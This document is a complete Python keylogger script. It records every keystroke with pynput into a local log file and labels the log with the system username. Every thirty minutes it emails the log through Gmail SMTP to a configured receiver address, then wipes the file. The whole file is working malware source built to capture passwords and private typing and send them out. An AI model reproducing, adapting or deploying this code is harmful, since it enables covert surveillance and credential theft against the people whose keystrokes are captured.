#!/usr/bin/python

import time, smtplib, getpass, threading

from datetime import datetime # Display the date the log is made.
from pynput.keyboard import Key, Listener
from threading import Thread
from email.mime.multipart import MIMEMultipart # Creates a Email object.
from email.mime.text import MIMEText # For text.
from email.mime.application import MIMEApplication # For File Attachment

# Email information.

EMAILID = "EMAIL" # REPLACE:
EMAILPASS = "PASSWORD" # REPLACE

TOEMAIL = "RECEIVER" # REPLACE
INTERVALS = 30 # NUMBER OF MINUTES.
SECPERMIN = 60

CYCLE = INTERVALS * SECPERMIN # Time interval to Email and Clean Logs. (MIN * SECS/MIN)
FILENAME = "log.txt" # Filename.

# Dictionary stores all non-alphanumeric keys.
ReplaceCode = {Key.space: ' ', Key.enter: ' [enter]\n', Key.tab: '[tab]', Key.esc: ' [esc] ', Key.shift: ' [shift] ', Key.ctrl: ' [ctrl] ', Key.backspace: ' [back] ', Key.cmd: ' [cmd] ', Key.alt: ' [alt] ', Key.caps_lock: ' [caps] '}

# Key Press.
def on_press(key):

    text = None
    # Different Write Based on Key Pressed.
    if hasattr(key, 'char'):
        text = key.char
    elif key in ReplaceCode:
        text = ReplaceCode[key]
    # Write to file if text is valid.
    if text != None:
        write_file(FILENAME, text)


def sendemail():

    while True:

        time.sleep(CYCLE) # Pause for cycle time before sending email, will act as a clock.

        server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.

        server.starttls()  # secure connection.  --> encrypts all info beyond this point.

        try:

            server.login(EMAILID, EMAILPASS) # Logins to account.
            # EMAIL OBJECT
            email = MIMEMultipart()
            email['From'] = EMAILID
            email['To'] = TOEMAIL
            email['Subject'] = "Log from {0}".format(str(datetime.now()))

            # TEXT FILE
            logFile = MIMEApplication(open(FILENAME).read()) # Reads the file.
            logFile.add_header('Content-Disposition', 'attachment; filename=%s' % FILENAME) # Type of Content(i.e. attachment vs inline), attachment type.
            email.attach(logFile) # Attach the file to the email.

            email.attach(MIMEText('Contains the all key logs from user {0} on {1}'.format(getpass.getuser(),str(datetime.now().replace(microsecond=0))))) # Retrieves UserID from env var of system.

            server.sendmail(EMAILID, TOEMAIL, email.as_string()) # Sends it as a string form.

        except Exception as E:
                print(str(E)) # Error detected i.e. Login failed.
        finally:
            server.quit() # Close the connection.

        clean_file(FILENAME)

# Clears the file.
def clean_file(file):
    recreate_file(file)
    print("\nFILE IS CLEANED AND SENT.\n")

# Writes to the file.
def write_file(file, input):
    with open(file, 'a') as file:
        file.write(input)

def recreate_file(file):
    with open(file, 'w+') as file:
        file.write("User: {0} | Date: {1} \n".format(getpass.getuser(), datetime.now().replace(microsecond=0))) # Initialize File with Userid and Date.

# Function to retrieve Key presses.
def startlog():

    # Create a new file to write to.
    recreate_file(FILENAME)

    # Create Keyboard Listener.
    with Listener(on_press=on_press) as listener:
        listener.join()

# Main method.
def main():

    KeyLogger = Thread(target=startlog, daemon=True) # daemonic thread --> Stop threads once Main ends.
    Timer = Thread(target=sendemail, daemon=True)

    try:
        # Multithread
        KeyLogger.start() # Thread to log key strokes.
        Timer.start() # Thread to time intervals to email and clear the file.

        # Shows all active threads.
        print(str(threading.enumerate()) + "\n")

        # Prevent main thread from finishing.
        KeyLogger.join()
        Timer.join()

    except KeyboardInterrupt: # Once 'ctrl+c' is detected, terminate main thread (also terminates all daemonic threads)

        print('\nProgram terminated.\n')

# Execute if it is the main module.
if __name__ == "__main__":

    main()
